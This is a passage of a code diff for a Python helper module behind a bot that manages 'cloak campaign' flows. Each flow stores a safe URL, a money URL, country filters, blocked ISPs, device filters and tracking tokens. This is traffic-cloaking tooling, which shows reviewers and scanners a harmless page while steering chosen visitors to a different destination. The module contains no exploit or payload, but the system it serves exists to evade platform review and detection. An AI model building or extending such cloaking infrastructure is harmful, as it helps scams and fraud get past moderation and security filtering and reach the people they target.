@@ -1,94 +1,100 @@
 """
-High-level domain + token management used by bot handlers.
-Wraps db.models so handlers never import db directly.
+High-level flow management used by bot handlers.
+A "flow" is a named cloak campaign unit.
 """
 from db.models import (
-    domain_add, domain_remove, domain_list, domain_get, domain_update,
+    flow_add, flow_remove, flow_list, flow_get, flow_update,
     link_create, link_revoke_all, link_list,
 )
 
 
-# ── Domain helpers ─────────────────────────────────────────────────────────────
+# ── Flow helpers ───────────────────────────────────────────────────────────────
 
-def add_domain(domain: str) -> bool:
-    return domain_add(domain.lower())
-
-
-def remove_domain(domain: str) -> bool:
-    return domain_remove(domain.lower())
+def add_flow(flow_name: str) -> bool:
+    return flow_add(flow_name.lower())
 
 
-def get_all_domains():
-    return domain_list()
+def remove_flow(flow_name: str) -> bool:
+    return flow_remove(flow_name.lower())
 
 
-def get_domain(domain: str):
-    return domain_get(domain.lower())
+def get_all_flows():
+    return flow_list()
 
 
-def require_domain(domain: str):
-    """Return domain row or raise ValueError."""
-    row = domain_get(domain.lower())
+def get_flow(flow_name: str):
+    return flow_get(flow_name.lower())
+
+
+def require_flow(flow_name: str):
+    """Return flow row or raise ValueError."""
+    row = flow_get(flow_name.lower())
     if not row:
-        raise ValueError(f"Domain `{domain}` not found. Add it first with /adddomain.")
+        raise ValueError(f"Flow `{flow_name}` not found. Create it first with /newflow.")
     return row
 
 
-def set_safe_url(domain: str, url: str) -> bool:
-    return domain_update(domain.lower(), safe_url=url)
+def set_domain(flow_name: str, domain: str) -> bool:
+    return flow_update(flow_name.lower(), domain=domain.lower())
 
 
-def set_money_url(domain: str, url: str) -> bool:
-    return domain_update(domain.lower(), money_url=url)
+def set_safe_url(flow_name: str, url: str) -> bool:
+    return flow_update(flow_name.lower(), safe_url=url)
 
 
-def set_countries(domain: str, countries: str) -> bool:
-    return domain_update(domain.lower(), countries=countries.upper())
+def set_money_url(flow_name: str, url: str) -> bool:
+    return flow_update(flow_name.lower(), money_url=url)
 
 
-def set_threshold(domain: str, value: int) -> bool:
-    return domain_update(domain.lower(), threshold=value)
+def set_countries(flow_name: str, countries: str) -> bool:
+    return flow_update(flow_name.lower(), countries=countries.upper())
 
 
-def add_blocked_isp(domain: str, isp_name: str) -> bool:
-    row = domain_get(domain.lower())
+def set_threshold(flow_name: str, value: int) -> bool:
+    return flow_update(flow_name.lower(), threshold=value)
+
+
+def add_blocked_isp(flow_name: str, isp_name: str) -> bool:
+    row = flow_get(flow_name.lower())
     if not row:
         return False
     existing = [x.strip() for x in (row["blocked_isps"] or "").split("|") if x.strip()]
     if isp_name not in existing:
         existing.append(isp_name)
-    return domain_update(domain.lower(), blocked_isps="|".join(existing))
+    return flow_update(flow_name.lower(), blocked_isps="|".join(existing))
 
 
-def set_notify_group(domain: str, group_id: str) -> bool:
-    return domain_update(domain.lower(), notify_group=group_id)
+def set_device_filter(flow_name: str, device_filter: str) -> bool:
+    return flow_update(flow_name.lower(), device_filter=device_filter)
 
 
-def set_notify_enabled(domain: str, enabled: bool) -> bool:
-    return domain_update(domain.lower(), notify_enabled=int(enabled))
+def set_notify_group(flow_name: str, group_id: str) -> bool:
+    return flow_update(flow_name.lower(), notify_group=group_id)
 
 
-def set_notify_level(domain: str, level: str) -> bool:
-    return domain_update(domain.lower(), notify_level=level)
+def set_notify_enabled(flow_name: str, enabled: bool) -> bool:
+    return flow_update(flow_name.lower(), notify_enabled=int(enabled))
 
 
-def set_device_filter(domain: str, device_filter: str) -> bool:
-    return domain_update(domain.lower(), device_filter=device_filter)
+def set_notify_level(flow_name: str, level: str) -> bool:
+    return flow_update(flow_name.lower(), notify_level=level)
 
 
 # ── Token helpers ──────────────────────────────────────────────────────────────
 
-def generate_token(domain: str) -> str:
-    return link_create(domain.lower())
+def generate_token(flow_name: str) -> str:
+    row = require_flow(flow_name)
+    return link_create(flow_name.lower(), row["domain"])
 
 
-def regenerate_token(domain: str) -> str:
-    link_revoke_all(domain.lower())
-    return link_create(domain.lower())
+def regenerate_token(flow_name: str) -> str:
+    row = require_flow(flow_name)
+    link_revoke_all(flow_name.lower())
+    return link_create(flow_name.lower(), row["domain"])
 
 
-def get_active_links(domain: str):
-    return link_list(domain.lower())
+def get_active_links(flow_name: str):
+    return link_list(flow_name.lower())
 
 
 def token_url(domain: str, token: str) -> str:
